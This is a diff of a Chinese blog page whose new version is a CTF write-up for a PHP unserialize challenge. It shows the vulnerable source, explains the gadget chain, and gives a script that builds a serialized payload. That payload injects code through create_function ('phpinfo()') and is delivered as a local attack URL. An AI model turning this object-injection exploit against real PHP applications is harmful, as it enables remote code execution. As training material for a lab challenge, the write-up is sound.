@@ -1,114 +1,290 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-
 <head>
-  <head>
   <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="author" content="viggo" />
-  <title>greetdawn&#39;s Blog - The God love people</title>
-  <meta name="keywords" content="Web安全,Linux,Python,Life">
-  <meta name="description" content="Love coding,Love life!">
-  <link rel="shortcut icon" href="/favicon.ico">
   
-<link rel="stylesheet" href="/css/hclonely.css">
-<link rel="stylesheet" href="//fonts.loli.net/css?family=Arimo:400,700,400italic.css">
-<link rel="stylesheet" href="/css/fonts/linecons/css/linecons.min.css">
-<link rel="stylesheet" href="/css/fonts/fontawesome/css/all.min.css">
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-<link rel="stylesheet" href="/css/xenon-core.min.css">
-<link rel="stylesheet" href="/css/xenon-components.min.css">
-<link rel="stylesheet" href="/css/xenon-skins.min.css">
-<link rel="stylesheet" href="/css/nav.min.css">
-
-  
-<script src="/js/jquery-1.11.1.min.js"></script>
-
-  <script>
-    var userDefinedSearchData = {"custom":false,"thisSearch":"https://www.baidu.com/s?wd=","thisSearchIcon":"url(https://www.baidu.com/favicon.ico)","hotStatus":true,"data":[{"name":"百度","img":"url(https://www.baidu.com/favicon.ico)","url":"https://www.baidu.com/s?wd="}]};
-    var expandAll = false;
-  </script>
-  
-<script src="/js/header.js"></script>
-
-  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-  <!--[if lt IE 9]>
-        
-<script src="/js/html5shiv.min.js"></script>
-
-        
-<script src="/js/respond.min.js"></script>
-
-    <![endif]-->
-  <!-- / FB Open Graph -->
+  <title>php-unserialize-getflag | greetdawn&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta property="og:type" content="article">
-  <meta property="og:url" content="http://www.greetdawn.top/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/index.html">
-  <meta property="og:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta property="og:description" content="Love coding,Love life!">
-  <meta property="og:site_name" content="greetdawn&#39;s Blog - The God love people">
+<meta property="og:title" content="php-unserialize-getflag">
+<meta property="og:url" content="http://www.greetdawn.top/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/index.html">
+<meta property="og:site_name" content="greetdawn&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg">
+<meta property="og:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211206173317019.png">
+<meta property="article:published_time" content="2021-12-06T09:18:53.000Z">
+<meta property="article:modified_time" content="2021-12-06T09:40:10.511Z">
+<meta property="article:author" content="丨greetdawn丨">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg">
   
-  <meta property="og:image" content="/images/webstack_banner_cn.png">
-  
-  <!-- / Twitter Cards -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="greetdawn&#39;s Blog - The God love people">
-  <meta name="twitter:description" content="Love coding,Love life!">
-  
-  <meta name="twitter:image" content="/images/webstack_banner_cn.png">
+    <link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
   
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
+    <link rel="shortcut icon" href="/favicon.ico">
   
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="greetdawn's Blog" type="application/atom+xml">
-</head>
+  
+<link rel="stylesheet" href="/css/typing.css">
 
-</head>
+  
+<link rel="stylesheet" href="/css/donate.css">
 
-
-
-
-  <footer class="main-footer sticky footer-type-1">
-  <div class="footer-inner">
-    <!-- Add your copyright text here -->
-    <p>
-      
-      &copy; 2020 - 2022
-      <a href="javascript:void(0);"><strong>丨greetdawn丨</strong></a> | Design by <a href="http://viggoz.com" target="_blank"><strong>Viggo</strong></a> | Power by <a href="https://hexo.io/" target="_blank"><strong>Hexo</strong></a> & <a href="https://github.com/HCLonely/hexo-theme-webstack/" target="_blank"><strong>hexo-theme-webstack</strong></a>
-    </p>
+  
+  
     
-    <div class="go-up">
-      <a href="#" rel="go-top">
-        <i class="fas fa-angle-up"></i>
-      </a>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  
+    
+      <body>
+    
+  
+      <div id="container" class="container">
+        <article id="post-web-security/php-code-audit/php-unserialize-getflag" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <header id="header" class="header">
+  <nav class="mobile-nav">
+    <h1 class="nickname">NickName</h1>
+    <ul class="mobile-nav-menu">
+      <label for="mobile-menu-toggle"><a id="menu-button">&#9776; Menu</a></label>
+      <input type="checkbox" id="mobile-menu-toggle"/>
+      <ul class="mobile-nav-link">
+        
+        <a href="/">Home</a>
+        
+        <a href="/archives">Archives</a>
+        
+        <a href="/about">About</a>
+        
+      </ul>
+    </ul>
+  </nav>
+	
+		<nav id="main-nav" class="main-nav nav-left">
+	
+	
+	  <a class="main-nav-link" href="/">Home</a>
+	
+	  <a class="main-nav-link" href="/archives">Archives</a>
+	
+	  <a class="main-nav-link" href="/about">About</a>
+	
+  </nav>
+</header>
+
+  <hr/>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      php-unserialize-getflag
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry typo" itemprop="articleBody">
+      
+        <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/kitten-g9b6b71c7c_1920.jpg" alt="kitten-g9b6b71c7c_1920"></p>
+<span id="more"></span>
+
+<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$pwd</span><span class="token operator">=</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">func</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+         <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>        
+			<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"welcome "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod1</span><span class="token punctuation">;</span>
+              
+        <span class="token punctuation">&#125;</span> 
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span>
+<span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>
+         <span class="token keyword">public</span> <span class="token variable">$action</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">action</span><span class="token punctuation">;</span>
+            <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?></span></span> </code></pre>
+
+
+
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><code>php</code>反序列化真要被<code>ctf</code>给玩烂了</p>
+<p>这道题的代码不多，但是反正我是不会</p>
+<p>逻辑思路是有，但是不会构造的，接下来就简单的分析一下吧</p>
+<p>利用类<code>func</code>中的<code>__destruct()</code>魔法函数，调用触发类<code>GetFlag</code>中<code>get_flag</code>方法，根据<code>$a(&#39;&#39;, $this-&gt;code);</code>这行代码，可以构造<code>create_function</code>函数触发，逻辑都很简单。这里唯独就是不知道怎么给类<code>func</code>中的key构造传参</p>
+<p>后面才知道可以这么传参：<code>$key = serialize([new GetFlag(), &quot;get_flag&quot;]);</code></p>
+<h2 id="构造利用"><a href="#构造利用" class="headerlink" title="构造利用"></a>构造利用</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">class</span> <span class="token class-name-definition class-name">func</span>
+	<span class="token punctuation">&#123;</span>
+			<span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+			<span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+			<span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>
+			<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+			<span class="token punctuation">&#123;</span>        
+				<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"welcome "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mod1</span><span class="token punctuation">;</span>
+					  
+			<span class="token punctuation">&#125;</span> 
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">class</span> <span class="token class-name-definition class-name">GetFlag</span>
+	<span class="token punctuation">&#123;</span>        
+	<span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">";&#125;phpinfo();//"</span><span class="token punctuation">;</span>
+		<span class="token keyword">public</span> <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'create_function'</span><span class="token punctuation">;</span>
+		<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">action</span><span class="token punctuation">;</span>
+			<span class="token variable">$a</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+
+	
+	<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"get_flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+<span class="token delimiter important">?></span></span></code></pre>
+
+<p><strong>output：</strong></p>
+<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;10279.php?0&#x3D;O:4:%22func%22:3:&#123;s:4:%22mod1%22;N;s:4:%22mod2%22;N;s:3:%22key%22;s:116:%22a:2:&#123;i:0;O:7:%22GetFlag%22:2:&#123;s:4:%22code%22;s:14:%22;&#125;phpinfo();&#x2F;&#x2F;%22;s:6:%22action%22;s:15:%22create_function%22;&#125;i:1;s:8:%22get_flag%22;&#125;%22;&#125;</code></pre>
+
+<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20211206173317019.png" alt="image-20211206173317019"></p>
+
+      
+      
     </div>
+    <footer class="article-footer">
+      <ul class="article-meta">
+        <li>
+          <span class="label">Published Date:</span>
+          <a href="/2021/12/06/web-security/php-code-audit/php-unserialize-getflag/" class="article-date">
+  <time class="dt-published" datetime="2021-12-06T09:18:53.000Z" itemprop="datePublished">2021-12-06</time>
+</a>
+
+        </li>
+        
+          <li>
+            <span class="label">Category:</span>
+            
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a>
   </div>
-</footer>
-</div>
-</div>
-
-<script src="/js/bootstrap.min.js"></script>
-<script src="/js/TweenMax.min.js"></script>
-<script src="/js/resizeable.min.js"></script>
-<script src="/js/joinable.js"></script>
-<script src="/js/xenon-api.min.js"></script>
-<script src="/js/xenon-toggles.min.js"></script>
-<script src="/js/xenon-custom.min.js"></script>
 
 
-<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+          </li>
+        
+        
+          <li>
+            <span class="label">Tag:</span>
+            
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">PHP反序列化</a></li></ul>
+
+
+          </li>
+        
+        <hr/>
+      </ul>
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav" class="article-nav">
+  
+    <a href="/2021/12/07/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/xiyu-new-bachang-cfs/" id="article-nav-newer" class="article-nav-link-wrap newer">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          第三期cfs靶场练习
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/12/01/web-security/php-code-audit/php-unserialize-clone/" id="article-nav-older" class="article-nav-link-wrap older">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">php反序列化之魔法函数clone</div>
+    </a>
+  
+</nav>
+
+
+  
+</article>
 
 
 
-<script src="/js/lozad.min.js"></script>
+
+
+
+
+
+
+
+      </div>
+      
+    <footer id="footer" class="post-footer footer">
+      
+      <hr/>
+      <div id="footerContent" class="footer-content">
+        <p>ipsum dolor sit amet, <strong>consectetur adipiscing elit.</strong> Fusce eget urna vitae velit <em>eleifend interdum at ac nisi. In nec ligula lacus. Cum sociis natoque</em> penatibus et magnis dis parturient montes, nascetur ridiculus mus. Sed eu cursus erat, ut dapibus quam. Post</p>
+
+
+      </div>
+    </footer>
+
+      
+
+
+
+
+
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
 
 
 
   
-  <!-- 直接添加html内容即可 -->
-<!-- 可设置多行 -->
-  
-</body>
+<script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
 
+
+
+
+<script src="/js/typing.js"></script>
+
+<!--[if lt IE 9]>
+<script src="https://cdn.jsdelivr.net/npm/html5shiv@3/dist/html5shiv.min.js"></script>
+<![endif]-->
+
+
+
+
+
+
+
+    </div>
+  </body>
 </html>
